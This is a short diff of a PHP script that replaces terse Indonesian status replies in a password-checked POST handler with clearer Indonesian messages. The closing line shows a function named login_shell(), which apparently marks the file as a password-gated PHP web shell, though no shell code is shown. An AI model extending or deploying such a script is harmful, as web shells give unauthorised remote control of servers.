@@ -47,12 +47,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             // Tandai bahwa pesan sudah dikirim
             $_SESSION['message_sent'] = true;
 
-            echo "masok";
+            echo "Pesan berhasil dikirim.";
         } else {
-            echo "udah";
+            echo "Pesan sudah dikirim untuk sesi ini.";
         }
     } else {
-        echo "ulang coba!";
+        echo "Password salah. Silakan coba lagi.";
     }
 }
 function login_shell() {
